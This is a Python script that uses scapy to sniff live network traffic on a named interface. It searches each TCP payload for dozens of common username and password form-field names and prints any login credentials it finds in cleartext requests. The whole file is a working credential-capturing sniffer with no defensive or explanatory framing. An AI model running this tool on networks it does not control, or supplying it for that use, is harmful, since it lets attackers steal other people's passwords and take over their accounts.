from scapy.all import *
from urllib import parse
import re

iface = "enp34s0"


def get_login_pass(body):
    user = None
    passwd = None

    userfields = ['log', 'login', 'wpname', 'ahd_username', 'unickname', 'nickname', 'user', 'alias', 'pseudo', 'email', 'username', '_username', 'userid', 'from_loginname', 'login_id', 'loginid', 'session_key', 'sessionkey', 'pop_login', 'uid', 'id', 'uname',
                  'ulogin', 'acctname', 'account', 'member', 'mailaddress', 'membername', 'login_email', 'loginusername', 'uin', 'sign-in', 'usuario']

    passfields = ['ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password',
                  'login_password', 'form_pw', 'pw', 'passwort', 'passwrd', 'wppassword', 'upasswd', 'senha', 'contrasena']

    for login in userfields:
        login_re = re.search('(%s=[^&]+)' % login, body, re.IGNORECASE)
        if login_re:
            user = login_re.group()
    for passfield in passfields:
        pass_re = re.search('(%s=[^&]+)' % passfield, body, re.IGNORECASE)
        if pass_re:
            passwd = pass_re.group()
    if user and passwd:
        return(user, passwd)


def pkt_parser(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP):
        body = str(packet[TCP].payload)
        user_pass = get_login_pass(body)
        if user_pass != None:
            print(packet[TCP].payload)
            print(parse.unquote(user_pass[0]))
            print(parse.unquote(user_pass[1]))
    else:
        pass


try:
    sniff(iface=iface, prn=pkt_parser, store=0)
except KeyboardInterrupt:
    print('Exiting')
    exit(0)
